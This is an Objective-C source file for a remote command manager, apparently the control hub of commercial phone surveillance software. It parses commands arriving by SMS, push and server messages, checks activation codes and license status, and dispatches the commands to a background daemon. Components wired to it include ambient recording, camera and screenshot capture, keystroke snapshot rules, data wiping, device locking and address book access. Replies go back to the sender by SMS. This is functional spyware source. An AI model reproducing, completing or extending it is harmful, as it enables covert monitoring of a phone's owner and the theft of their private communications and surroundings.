/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdManagerImpl
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  17/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "RemoteCmdManagerImpl.h"

#import "SMSSender.h"
#import "EventDeliveryManager.h"
#import "ServerAddressManager.h"
#import "EventDelegate.h"
#import "EventDelivery.h"
#import "PreferenceManager.h"
#import "ActivationManagerProtocol.h"
#import "AppContext.h"
#import "DataDelivery.h"
#import "EventDelivery.h"
#import "EventRepository.h"
#import "ConnectionHistoryManager.h"
#import "ConfigurationManager.h"
#import "SystemUtils.h"
#import "AddressbookManager.h"

#import "RemoteCmdProcessingManager.h"
#import "RemoteCmdData.h"
#import "RemoteCmdStore.h"
#import "SMSCmd.h"
#import "SMSCmdReceiver.h"
#import "SMSCmdCenter.h"
#import "FxSystemEvent.h"
#import "RemoteCmdParser.h"
#import "RemoteCmdUtils.h"
#import "LicenseInfo.h"
#import "LicenseManager.h"
#import "RemoteCmdExceptionCode.h"
#import "LicenseStatusEnum.h"
#import "RemoteCmdErrorMessage.h"
#import "PCC.h"
#import "PCCCmdCenter.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"
#import "RemoteCmdCode.h"
#import "PushCmdCenter.h"
#import "PushCmd.h"

@interface RemoteCmdManagerImpl (PrivateAPI)
- (void) createSystemEvent: (id) aCommand;
- (void) errorWithName: (NSString *) aErrorName
			withReason: (NSString *) aErrorReason 
		  andErrorCode: (CmdExceptionCode) aErrorCode; 
- (void) sendReplySMSWithErrorMessage: (NSString *) aErrorMessage 
				      andSenderNumber: (NSString *) aSenderNumber; 
- (void) processCommandData: (RemoteCmdData *) aRemoteCmdData;
- (void) dropStore;
- (NSString *) createPCCMessage :(PCC *) aPCCCommand;
- (NSString *) commandStorePath;
- (BOOL) resgistrationStatus: (NSString *) aRemoteCmdCode;
- (BOOL) canExecuteProcess : (RemoteCmdData *) aRemoteCmdData;
- (BOOL) alwaysExecuteCmd: (RemoteCmdData *) aRemoteCmdData;
- (RemoteCmdData *) createRemoteCommandData: (id) aCommand;
@end

@implementation RemoteCmdManagerImpl

@synthesize mLicenseManager;
@synthesize mDataDelivery;
@synthesize mEventDelegate;
@synthesize mSMSSender;
@synthesize mEventDelivery;
@synthesize mAppContext;
@synthesize mServerAddressManager;
@synthesize mPreferenceManager;
@synthesize mActivationManagerProtocol;
@synthesize mRemoteCmdProcessingManager;
@synthesize mEventRepository;
@synthesize mConnectionHistoryManager;
@synthesize mConfigurationManager;
@synthesize mSystemUtils;
@synthesize mSMSCmdCenter;
@synthesize mPCCCmdCenter, mPushCmdCenter;
@synthesize mSupportCmdCodes;
@synthesize mAddressbookManager;
@synthesize mMediaSearchPath;
@synthesize mSoftwareUpdateManager;
@synthesize mUpdateConfigurationManager;
@synthesize mIMVersionControlManager;
@synthesize mKeySnapShotRuleManager;
@synthesize mDeviceSettingsManager;

@synthesize mSyncTimeManager;
@synthesize mSyncCDManager;
@synthesize mWipeDataManager;
@synthesize mDeviceLockManager;
@synthesize mApplicationProfileManager;
@synthesize mUrlProfileManager;
@synthesize mBookmarkManager;
@synthesize mApplicationManager;
@synthesize mAmbientRecordingManager;
@synthesize mCalendarManager;
@synthesize mNoteManager;
@synthesize mCameraEventCapture;
@synthesize mHistoricalEventManager;
@synthesize mScreenshotCaptureManager;
@synthesize mTemporalControlManager;

/**
 - Method name: init
 - Purpose:This method is used to initialize the RemoteCmdManagerImpl class
 - Argument list and description: aSMSCommand (SMSCmd)
 - Return description: self (RemoteCmdManagerImpl)
*/

- (id) init {
	if ((self = [super init])) {
		mSMSCmdCenter = [[SMSCmdCenter alloc] initWithRCM:self];
		mPCCCmdCenter = [[PCCCmdCenter alloc] initWithRCM:self];
        mPushCmdCenter = [[PushCmdCenter alloc] initWithRCM:self];
	}
	return self;
}

/**
 - Method name: launch
 - Purpose:This method is used to launch  RemoteCmdManager
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) launch {
	mRemoteCmdStore = [[RemoteCmdStore alloc] initAndOpenDatabaseWithPath:[self commandStorePath]];
	mRemoteCmdProcessingManager = [[RemoteCmdProcessingManager alloc] initWithStore:mRemoteCmdStore];
    #if TARGET_OS_IPHONE
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMSMSSender:mSMSSender];
    #endif
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMEventDelegate:mEventDelegate];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMDataDelivery:mDataDelivery];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMEventDelivery:mEventDelivery];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMAppContext:mAppContext];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMServerAddressManager:mServerAddressManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMActivationManagerProtocol:mActivationManagerProtocol];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMPreferenceManager:mPreferenceManager];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMConnectionHistoryManager:mConnectionHistoryManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMEventRepository:mEventRepository];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMConfigurationManager:mConfigurationManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMSystemUtils:mSystemUtils];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMMediaSearchPath:mMediaSearchPath];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMLicenseManager:mLicenseManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMSoftwareUpdateManager:mSoftwareUpdateManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMUpdateConfigurationManager:mUpdateConfigurationManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMIMVersionControlManager:mIMVersionControlManager];

}

/**
 - Method name: relaunchForFeaturesChange
 - Purpose:This method is used to relaunch RemoteCmdManager to change some features
 - Argument list and description: No Argument
 - Return description: No return type
 */
- (void) relaunchForFeaturesChange {
    #if TARGET_OS_IPHONE
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMAddressbookManager:mAddressbookManager];
    #endif
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMSyncTimeManager:mSyncTimeManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMSyncCDManager:mSyncCDManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMWipeDataManager:mWipeDataManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMApplicationProfileManager:mApplicationProfileManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMUrlProfileManager:mUrlProfileManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMBookmarkManager:mBookmarkManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMApplicationManager:mApplicationManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMAmbientRecordingManager:mAmbientRecordingManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMCalendarManager:mCalendarManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMNoteManager:mNoteManager];
	[[RemoteCmdUtils sharedRemoteCmdUtils] setMCameraEventCapture:mCameraEventCapture];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMKeySnapShotRuleManager:mKeySnapShotRuleManager];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMDeviceSettingsManager:mDeviceSettingsManager];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMHistoricalEventManager:mHistoricalEventManager];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMScreenshotCaptureManager:mScreenshotCaptureManager];
    [[RemoteCmdUtils sharedRemoteCmdUtils] setMTemporalControlManager:mTemporalControlManager];
}

#pragma mark implementation of RemoteCmdManager

/**
 - Method name: processSMSCommand
 - Purpose:This method is used to process the SMS Command
 - Argument list and description: aSMSCommand (SMSCmd)
 - Return description: No return type
*/

- (void) processSMSCommand: (SMSCmd*) aSMSCommand {
	DLog (@"processSMSCommand--->%@",aSMSCommand);
	@try {
		  [self createSystemEvent:aSMSCommand];
		  RemoteCmdData *cmdData=[self createRemoteCommandData:aSMSCommand];
		  [self processCommandData:cmdData];
	}
	@catch (FxException * exception) {
		
		   NSString *errorMessageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:nil
																								 andErrorCode:[exception errorCode]];
		   [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:aSMSCommand
												 andReplyMessage:errorMessageFormat];
		    [self sendReplySMSWithErrorMessage:errorMessageFormat
						    andSenderNumber:[aSMSCommand mSenderNumber]];
	}
	
}

/**
 - Method name: processPCCommand
 - Purpose:This method is used to process the PCC Command
 - Argument list and description: aPCCommand (NSArray)
 - Return description: No return type
*/

- (void) processPCCCommand: (NSArray*) aPCCCommand {
	DLog(@"processPCCCommand");
    @try {
		  for (PCC *pccCmd in aPCCCommand) {
			 [self createSystemEvent:pccCmd];
		     RemoteCmdData *cmdData=[self createRemoteCommandData:pccCmd];
			 DLog (@"Covert Pcc into Remote Command Data......");
			 DLog (@"Command Code:%@",[cmdData mRemoteCmdCode]);
			 DLog (@"Sender Number:%@",[cmdData mSenderNumber]);
			 DLog (@"Arguments:%@",[cmdData mArguments]);							
		     [self processCommandData:cmdData];
	       }
	}
	@catch (FxException * exception) {
		NSString *errorMessageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:nil
																								 andErrorCode:[exception errorCode]];
		[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:aPCCCommand
												 andReplyMessage:errorMessageFormat];
	}
}

/**
 - Method name: processPushCommand
 - Purpose:This method is used to process the Push Command
 - Argument list and description: aPushCommand (PushCmd)
 - Return description: No return type
 */

- (void) processPushCommand: (PushCmd *) aPushCommand {
    DLog(@"processPushCommand");
    @try {
        [self createSystemEvent:aPushCommand];
        RemoteCmdData *cmdData=[self createRemoteCommandData:aPushCommand];
        DLog (@"Covert Push into Remote Command Data......");
        DLog (@"Command Code:%@",[cmdData mRemoteCmdCode]);
        DLog (@"Sender Number:%@",[cmdData mSenderNumber]);
        DLog (@"Arguments:%@",[cmdData mArguments]);
        [self processCommandData:cmdData];
    }
    @catch (FxException * exception) {
        NSString *errorMessageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:nil
                                                                                                 andErrorCode:[exception errorCode]];
        [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:aPushCommand
                                                 andReplyMessage:errorMessageFormat];
    }
}

/**
 - Method name: processPendingRemoteCommands
 - Purpose:This method is used to process the Pending Remote Commands
 - Argument list and description: No arguments
 - Return description: No return type
*/

- (void) processPendingRemoteCommands {
	@try {
		if (mRemoteCmdStore) {
			DLog (@"processPendingRemoteCommands..");
		    NSArray *remoteCommands= [mRemoteCmdStore selectAllCmd];
			DLog (@"Remote Commands:%@",remoteCommands);
		    for (RemoteCmdData *cmdData in remoteCommands) {
			  [mRemoteCmdStore deleteCmd:cmdData.mRemoteCmdUID];
			  [self processCommandData:cmdData];
		    }
		}
	 }
	@catch (FxException * exception) { // Very unlikely to come here the exception...
	     DLog (@"DB Exception---->%@",[exception excReason]);
	}
}

/**
 - Method name: clearAllPendingRemoteCommands
 - Purpose:This method is used to clear all the pending remote commands
 - Argument list and description: No arguments
 - Return description: No Return 
*/

- (void) clearAllPendingRemoteCommands {
	//Remove processor from the Queue
	if (mRemoteCmdProcessingManager) {
		[mRemoteCmdProcessingManager clearProcessorQueue];
	}
	// Delete remote command store 
	[self dropStore];
}

- (NSString *) replySMSPattern {
	NSString *pattern = [[RemoteCmdUtils sharedRemoteCmdUtils] getProductIdAndVersion];
	return (pattern);
}


/**
 - Method name: dropStore
 - Purpose:This method is used to delete the persistent store
 - Argument list and description: No arguments
 - Return description: No Return 
 */

- (void) dropStore {
	if (mRemoteCmdStore) {
	    [mRemoteCmdStore dropDB:[self commandStorePath]];
		[mRemoteCmdStore recreateDB:[self commandStorePath]];
	}
}

#pragma mark implementation of RemoteCmdManager private methods

/**
 - Method name: createSystemEvent
 - Purpose:This method is used to createSystemEvent
 - Argument list and description: No argument
 - Return description: No return type
*/

- (void) createSystemEvent: (id) aCommand {
	id command=nil;
	FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
	if ([aCommand isKindOfClass:[SMSCmd class]]){
		command=(SMSCmd *)aCommand;
		DLog (@"Command:%@",[command mMessage]);
		[systemEvent setMessage:[command mMessage]];
		[systemEvent setSystemEventType:kSystemEventTypeSmsCmd];
	}
	else if ([aCommand isKindOfClass:[PCC class]]) {
		command=(PCC *)aCommand;
		[systemEvent setMessage:[self createPCCMessage:command]];
		[systemEvent setSystemEventType:kSystemEventTypeNextCmd];
    } else {
        command=(PushCmd *)aCommand;
        DLog (@"Command push:%@",[command mPushMessage]);
        [systemEvent setMessage:[command mPushMessage]];
        [systemEvent setSystemEventType:kSystemEventTypePushCmd];
    }
	DLog (@"createSystemEvent--->%@",aCommand);
	[systemEvent setDirection:kEventDirectionIn];
	[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
	}
	[systemEvent release];
}

/**
 - Method name:createPCCMessage:
 - Purpose:This method is used to send reply message 
 - Argument list and description: aRemoteCommandData (RemoteCmdData *)
 - Return type and description:No Return
 */
- (NSString *) createPCCMessage :(PCC *) aPCCCommand {
	NSString *pccMessage=[NSString stringWithFormat:@"<%lu>",(unsigned long)[aPCCCommand PCCID]];
	pccMessage=[pccMessage stringByAppendingString:[NSString stringWithFormat:@"<%lu>",
													(unsigned long)[[aPCCCommand arguments] count]]];
	for(int index=0;index<[[aPCCCommand arguments] count]; index++)	{
		pccMessage=[pccMessage stringByAppendingString:[NSString stringWithFormat:@"<%@>",
														[[aPCCCommand arguments] objectAtIndex:index]]];
	}
	return pccMessage;
	
}

/**
 - Method name: createRemoteCommandData
 - Purpose:This method is used to create RemoteCommandData
 - Argument list and description: No argument
 - Return description: No (RemoteCmdData )
*/

- (RemoteCmdData *) createRemoteCommandData: (id) aCommand {
	DLog (@"createRemoteCommandData--->%@",aCommand);
	RemoteCmdParser *parser =[[RemoteCmdParser alloc] init]; 
	RemoteCmdData *cmdData = nil;
	if ([aCommand isKindOfClass:[SMSCmd class]])
		cmdData = [parser parseSMS:(SMSCmd*)aCommand];
	else if ([aCommand isKindOfClass:[PCC class]])
		cmdData = [parser parsePCC:(PCC*)aCommand];
    else
        cmdData = [parser parsePush:(PushCmd *)aCommand];
	[parser release];
	return cmdData;
}

/**
 - Method name: processCommandData
 - Purpose:This method is used to create RemoteCommandData
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No Argument
*/

- (void) processCommandData: (RemoteCmdData *) aRemoteCmdData {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	@try {
		 if([self canExecuteProcess:aRemoteCmdData]) {
			DLog (@"processCommandData--->%@",self.mRemoteCmdProcessingManager);
		    [self.mRemoteCmdProcessingManager queueAndProcess:aRemoteCmdData]; // Possible to raise only FxException with command not found
		 }
	}
	@catch (FxException * exception) {
		DLog (@"Queue and process FxException = %@", exception)
		NSString *errorMessageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[aRemoteCmdData mRemoteCmdCode]
																						andErrorCode:[exception errorCode]];
		[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:aRemoteCmdData
												 andReplyMessage:errorMessageFormat];
	    [self sendReplySMSWithErrorMessage: errorMessageFormat
						   andSenderNumber:[aRemoteCmdData mSenderNumber]];
	}
	@catch (NSException *exception) {
		DLog (@"Queue and process NSException = %@", exception)
	}
	[pool drain]; // drain is release
}

/**
 - Method name: resgistrationStatus
 - Purpose:This method is used to check whether command is registered or not
 - Argument list and description: aRemoteCmdData (aRemoteCmdCode)
 - Return description: No Argument
*/

- (BOOL) resgistrationStatus: (NSString *) aRemoteCmdCode{
	DLog (@"Check Registartion Status--->%@",aRemoteCmdCode);
	BOOL isRegistered=NO;
	for (NSString *cmdCode in mSupportCmdCodes) {
		if ([cmdCode isEqualToString:aRemoteCmdCode]) {
			isRegistered =YES;
			DLog (@"Command Code Found--->%@",cmdCode);
			break;
		}
		else {  DLog (@"Command Code is not supported") }
			
   }
	DLog (@"Did you see me in console?");
//	isRegistered =YES; // For testing all commands are registered
	return isRegistered;
}

/**
 - Method name: canExecuteProcess
 - Purpose:This method is used to check whether command is valid or not
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No Return
*/

- (BOOL) canExecuteProcess: (RemoteCmdData *) aRemoteCmdData {
	BOOL canExecute=NO;
	
	LicenseInfo *info=	[mLicenseManager mCurrentLicenseInfo];
	DLog (@"Licence Info:%@",info);
	DLog (@"Reg:%@",mSupportCmdCodes);
	
	//Check the liecence status
	if ([info licenseStatus]==ACTIVATED) {
		if([aRemoteCmdData mRemoteCmdType]==kRemoteCmdTypePCC ||
           [aRemoteCmdData mRemoteCmdType]==kRemoteCmdTypePUSH) {  //Checking PCC/PUSH Command Validation
			if ([self resgistrationStatus:[aRemoteCmdData mRemoteCmdCode]]) { // Check Registration status
				canExecute=YES;
			}
			else {
				[self errorWithName:@"canExecute"
						 withReason:@"Command Not Registered" 
					   andErrorCode:kCmdExceptionErrorCmdNotFoundRegistered];
			}

		}
		else {  // Checking SMS Command Validation
			if ([[aRemoteCmdData mArguments] count]>1) {
				NSString *activationCode =[[aRemoteCmdData mArguments] objectAtIndex:1];
				if([activationCode isEqualToString:[info activationCode]] ||  // Check valid activation code
				   [self alwaysExecuteCmd:aRemoteCmdData]) { // Commands which are always execute without activation code
					if ([self resgistrationStatus:[aRemoteCmdData mRemoteCmdCode]]) { // Check Registration status
						canExecute=YES;
		            }
		           else {
					  [self errorWithName:@"canExecute"
								withReason:@"Command Not Registered" 
							  andErrorCode:kCmdExceptionErrorCmdNotFoundRegistered];
					}
				} 
			    else {
				   [self errorWithName:@"canExecute" 
							withReason:@"Activation code deosn't not match in LicenseInfo" 
						  andErrorCode:kCmdExceptionErrorActivationCodeNotMatch];
			    }
			  } 
			  else {
				 [self errorWithName:@"canExecute"
						  withReason:@"Activation Code Invalid" 
					    andErrorCode:kCmdExceptionErrorActivationCodeInvalid];
		       }
		   }  
	}
	
	else {
		NSString *activationCode = @"";
		if ([[aRemoteCmdData mArguments] count] >= 2) {
			activationCode = [[aRemoteCmdData mArguments] objectAtIndex:1];
		}
		
		BOOL registerStatus = [self resgistrationStatus:[aRemoteCmdData mRemoteCmdCode]];
		if ([info licenseStatus] == DEACTIVATED ||
			[info licenseStatus] == LC_UNKNOWN) {
			if (registerStatus) {
				canExecute = YES;
			} else {
				[self errorWithName:@"canExecute"
						 withReason:@"Product Not Activated" 
					   andErrorCode:kCmdExceptionErrorProductNotActivated];
			}
		} else if ([info licenseStatus] == EXPIRED ||
				   [info licenseStatus] == DISABLE) {
			if (registerStatus) {
				if ([aRemoteCmdData mRemoteCmdType]==kRemoteCmdTypePCC ||
                    [aRemoteCmdData mRemoteCmdType]==kRemoteCmdTypePUSH) {
					canExecute = YES;
				} else { // SMS
					if ([activationCode isEqualToString:[info activationCode]] ||  // Check valid activation code
						[self alwaysExecuteCmd:aRemoteCmdData]) { // Commands which are always execute without activation code
						canExecute = YES;
					} else {
						[self errorWithName:@"canExecute" 
								 withReason:@"[EXPIRED | DISABLE] Activation code deosn't not match in LicenseInfo" 
							   andErrorCode:kCmdExceptionErrorActivationCodeNotMatch];
					}
				}
			} else { // Not register cmd
				if ([info licenseStatus] == DISABLE) {
					[self errorWithName:@"canExecute"
							 withReason:@"License Is Disabled" 
						   andErrorCode:kCmdExceptionErrorLicenseDisabled];
				} else if ([info licenseStatus] == EXPIRED) {
					[self errorWithName:@"canExecute"
							 withReason:@"License Is Expired" 
						   andErrorCode:kCmdExceptionErrorLicenseExpired];
				}
			}
		}
	}
	return canExecute;
}

- (BOOL) alwaysExecuteCmd: (RemoteCmdData *) aRemoteCmdData {
	BOOL always = NO;
	NSString *cmdCode = [aRemoteCmdData mRemoteCmdCode];
	if ([cmdCode isEqualToString:kRemoteCmdCodeRequestCurrentURL]) {
		always = YES;
	}
	return (always);
}

/**
 - Method name: errorWithName:withReason:andErrorCode
 - Purpose:This method is used to throw the exception
 - Argument list and description: aErrorName (NSString),aErrorReason (NSString),aErrorCode (CmdExceptionCode)
 - Return description: No Return
*/

- (void) errorWithName: (NSString *) aErrorName 
			withReason: (NSString *) aErrorReason 
		  andErrorCode: (CmdExceptionCode) aErrorCode {
	FxException* exception = [FxException exceptionWithName:aErrorReason andReason:aErrorReason];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMSWithErrorCode:andSenderNumber:
 - Purpose:This method is used to send the error message after validation
 - Argument list and description: aErrorCode (NSString),aSenderNumber (NSString *)
 - Return description: No Return
*/

- (void) sendReplySMSWithErrorMessage: (NSString *) aErrorMessage 
				      andSenderNumber: (NSString *) aSenderNumber {
	
	//Send error message
	 [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:aSenderNumber
														   andMessage:aErrorMessage];			
}

/**
 - Method name: commandStorePath
 - Purpose:This method is used to get the database path
 - Argument list and description: No Argument
 - Return description: path (NSString)
*/

- (NSString *) commandStorePath {
	NSString *path = [NSString stringWithFormat:@"%@rcm/", [DaemonPrivateHome daemonPrivateHome]];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:path];
	return ([NSString stringWithFormat:@"%@commandstore.db", path]);
}
		
/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class obect releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mLicenseManager release];
	mLicenseManager=nil;
	[mSMSSender release];
	mSMSSender=nil;
	[mEventDelegate release];
	mEventDelegate=nil;
	[mEventDelivery release];
	mEventDelivery=nil;
	[mAppContext release];
	mAppContext=nil;
	[mDataDelivery release];
	mDataDelivery=nil;
	[mEventDelivery release];
	mEventDelivery=nil;
	[mSMSCmdCenter release];
	mSMSCmdCenter=nil;
	[mSupportCmdCodes release];
	mSupportCmdCodes=nil;
	[mRemoteCmdUtils release];
	mRemoteCmdUtils=nil;
	[mPreferenceManager release];
	mPreferenceManager=nil;
	[mRemoteCmdStore release];
	mRemoteCmdStore=nil;
 	[mRemoteCmdProcessingManager release];
	mRemoteCmdProcessingManager=nil;
	[mPCCCmdCenter release];
	mPCCCmdCenter=nil;
    [mPushCmdCenter release];
    mPushCmdCenter = nil;
	[mServerAddressManager release];
	mServerAddressManager=nil;
	[mSystemUtils release];
	[mEventRepository release];
	mEventRepository=nil;
	[mConnectionHistoryManager release];
	mConnectionHistoryManager=nil;
	[mConfigurationManager release];
	mConfigurationManager=nil;
	[mAddressbookManager release];
	mAddressbookManager=nil;
	[mMediaSearchPath release];
	mMediaSearchPath=nil;
	[super dealloc];	
}

@end
